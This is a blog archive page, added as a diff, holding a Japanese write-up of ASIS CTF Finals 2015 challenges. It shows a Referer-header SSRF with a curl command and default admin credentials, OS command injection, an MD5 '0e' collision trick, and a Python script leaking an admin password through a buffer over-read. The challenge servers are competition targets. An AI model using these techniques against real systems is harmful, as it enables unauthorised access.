@@ -1,0 +1,198 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Archives: 2015/10 | 193s::Diary 2</title>
+  <meta name="author" content="193s">
+  
+  <meta name="description" content="193s">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="193s::Diary 2"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/blog/favicon.png" rel="icon">
+  <link rel="alternate" href="/blog/atom.xml" title="193s::Diary 2" type="application/atom+xml">
+  <link rel="stylesheet" href="/blog/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/blog/">193s::Diary 2</a></h1>
+  <h2><a href="/blog/">yet another 193s::Diary</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper">
+<h2 class="archive-title">2015/10</h2>
+
+
+  
+    <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2015-10-13T10:24:04.000Z"><a href="/blog/2015/10/13/asis-ctf-finals-2015-writeup/">Oct 13 2015</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/blog/2015/10/13/asis-ctf-finals-2015-writeup/">ASIS CTF Finals 2015 write-up</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p><blockquote class="twitter-tweet" lang="ja"><p lang="und" dir="ltr">9th. <a href="http://t.co/OwYOJWVACy" target="_blank" rel="external">pic.twitter.com/OwYOJWVACy</a></p>&mdash; Ikumi Shimizu (@_193s) <a href="https://twitter.com/_193s/status/653459563551698944" target="_blank" rel="external">2015, 10月 12</a></blockquote></p>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p>scryptosとして参加．2576pts, 9位でした．<br>解いた問題: What’s example flag?, Flag Hunter, ultra compression, My blog, Impossible, Bodu, shop-1</p>
+<p><img src="/blog/imgs/lsZX2.png" width="500"></p>
+<h2 id="My_blog_(Web_150)">My blog (Web 150)</h2>
+<p>first solveを取った.</p>
+<p><code>/robots.txt</code>に<code>Disallow: /myblog_private_dir3ct0ry</code>という記述がある．手元からアクセスしても403を返すが，<code>printpage.php</code>がHTTPのRefererヘッダのURLに対してGETを飛ばしてpdfにしているのでこれを利用して<code>http://myblog.asis-ctf.ir:8088/myblog_private_dir3ct0ry/</code>を読ませてみたらログインページっぽいものが出てきた．どうやらアクセス元のipが向こうのものであったら通してくれるっぽい．<br><img src="http://i.imgur.com/S2M69hK.png" alt=""><br>しかし，HTMLのコードが読めないのでどこに対してどういう形のloginリクエストを投げているのかが不明．ここで偶然<code>nc 87.107.123.3 31337</code>でqualsのpwn問題，saw thisのバイナリが動いていることに気が付いた（！！）．チームメンバーが過去に書いていたexploitを使ってshell奪取，/tmp, /var/tmpが潰されていたものの/dev/shmは使えたのでここで適当に手元からシェルスクリプトを転送しながら作業していたらloginページのソースコードが取れた．</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="title">title</span>&gt;</span>My blog - Admin Panel<span class="tag">&lt;/<span class="title">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="title">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="title">div</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="title">h1</span>&gt;</span>My Blog<span class="tag">&lt;/<span class="title">h1</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="title">h2</span>&gt;</span>Admin Panel<span class="tag">&lt;/<span class="title">h2</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;/<span class="title">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="title">div</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="title">form</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">name</span>=<span class="value">"username"</span> <span class="attribute">placeholder</span>=<span class="value">"Username"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">name</span>=<span class="value">"password"</span> <span class="attribute">placeholder</span>=<span class="value">"Password"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">name</span>=<span class="value">"login"</span> <span class="attribute">value</span>=<span class="value">"Login"</span>/&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="title">form</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="title">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="title">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></div></pre></td></tr></table></figure>
+
+<p>SQLi等は必要なく<code>admin:admin</code>で入れた．<br><code>curl &#39;http://myblog.asis-ctf.ir:8088/printpage.php?id=2417648298&#39; -H &quot;Referer: http://myblog.asis-ctf.ir:8088/myblog_private_dir3ct0ry?username=admin&amp;password=admin&amp;login=Login&quot; &gt; 🏁.pdf</code></p>
+<p>flag: <code>ASIS{9c846eab5200c267cb593437780caa4d}</code></p>
+<h2 id="ultra_compression_(Web_125)">ultra compression (Web 125)</h2>
+<p>こちらもfirst solveを取った．</p>
+<p>ファイルを/ajax_php_file.phpにpostするとcompressしたファイルをへのリンクを表示する（URLだけで実際にはダウンロードできない，運営によるとこれが正常な動作らしい）．</p>
+<p>返されるリンクは<code>http://ucs.asis-ctf.ir/download.php?id=????</code>の形で，idの生成法則を見てみるとファイル名と一対一に対応している．<code>;</code>を入れるとidが途切れることなどから，（状況的に無理がある気もしたが）OSコマンドインジェクションの匂いを感じた．PHPSESSIDごとにキーが異なる単一換字暗号によってidが作られていることがわかったので，PHPSESSIDを固定した上でテーブルを作ってpayload作成-&gt;適当なコマンドを実行させてみたところ成功した．あとはやるだけ．<br>ls / -&gt; vmlinuz<br>ls /home/ -&gt; asis<br>ls /home/asis -&gt; flag.txt<br>cat /home/asis/flag.txt -&gt; <code>🏁</code><br>flag: <code>ASIS{72a126946e40f67a04d926dd4786ff15}</code></p>
+<h2 id="Bodu_(Crypto_175)">Bodu (Crypto 175)</h2>
+<p>問題名からしてRSA Boneh-Durfee’s Attack．<br>d = <code>89508186630638564513494386415865407147609702392949250864642625401059935751367507</code><br>flag: <code>ASIS{b472266d4dd916a23a7b0deb5bc5e63f}</code></p>
+<h2 id="Impossible_(Web_225)">Impossible (Web 225)</h2>
+<p>PHP MD5 collision．users.datのuser名の中にmd5が<code>^0e</code>なものが存在するので，collisionを見つけてregister.phpでパスワードを抜いてlogin -&gt; <code>🏁</code><br>flag: <code>ASIS{d9fb4932eb4c45aa793301174033dff9}</code></p>
+<h2 id="shop-1_(pwn_100)">shop-1 (pwn 100)</h2>
+<p>login時のbuffer over-readによってmemcmpの戻り値がleakできる．</p>
+<ol>
+<li>一度adminでlogin試行</li>
+<li>guestでlogin &amp; leak</li>
+<li>logout</li>
+</ol>
+<p>を繰り返すことでadminのパスワードが1文字ずつ特定できるので，適当にコードを書いて求めた．</p>
+<figure class="highlight python="><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> ebil <span class="keyword">import</span> *   <span class="comment"># &lt;- https://github.com/193s/ebil</span></div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line"><span class="keyword">exec</span> ebil(<span class="string">'./bragisdumu-shop'</span>, arch=<span class="string">'x86_64'</span>, remote=(<span class="string">'185.106.120.220'</span>, <span class="number">1337</span>))</div><div class="line"></div><div class="line">flag = <span class="string">''</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">  <span class="comment"># login</span></div><div class="line">  sendline(<span class="string">'admin'</span>)</div><div class="line">  sendline(flag + <span class="string">'\xff'</span>)</div><div class="line"></div><div class="line">  sendline(<span class="string">'guestaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>)</div><div class="line">  password = <span class="string">'guestbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'</span></div><div class="line">  sendline(password)</div><div class="line"></div><div class="line">  r.recvuntil(password)</div><div class="line">  line = r.recvline().strip()[<span class="number">0</span>:<span class="number">4</span>]</div><div class="line">  <span class="keyword">print</span> hexdump(line)</div><div class="line">  diff = struct.unpack(<span class="string">'&lt;i'</span>, line.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))[<span class="number">0</span>]</div><div class="line">  flag += chr(<span class="number">0xff</span>-diff)</div><div class="line">  log.success(<span class="string">'password: %s'</span> % flag)</div><div class="line"></div><div class="line">  <span class="comment"># logout</span></div><div class="line">  sendline(<span class="string">'8'</span>)</div><div class="line">  r.recvuntil(<span class="string">'Username: '</span>)</div></pre></td></tr></table></figure>
+
+<p>flag: <code>ASIS{304b0f16eb430391c6c86ab0f3294211}</code></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+  
+
+  <nav id="pagination">
+  
+  
+  <div class="clearfix"></div>
+</nav>
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:193s.github.io">
+  </form>
+</div>
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/blog/tags/CTF/">CTF</a><small>5</small></li>
+  
+    <li><a href="/blog/tags/test/">test</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/blog/2015/10/13/asis-ctf-finals-2015-writeup/">ASIS CTF Finals 2015 write-up</a>
+      </li>
+    
+      <li>
+        <a href="/blog/2015/09/23/csaw-ctf-2015-writeup/">CSAW CTF 2015 writeup (@_193s)</a>
+      </li>
+    
+      <li>
+        <a href="/blog/2015/09/08/MMACTF2015-writeup/">MMA CTF 1st 2015に出た話 (@_193s)</a>
+      </li>
+    
+      <li>
+        <a href="/blog/2015/08/31/tductf2015-writeup/">TDUCTF 2015の感想とwriteup</a>
+      </li>
+    
+      <li>
+        <a href="/blog/2015/05/05/VolgaCTF-2015-Quals-Write-up/">VolgaCTF 2015 Quals Write-up</a>
+      </li>
+    
+  </ul>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2015 193s
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/blog/js/jquery.imagesloaded.min.js"></script>
+<script src="/blog/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/blog/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
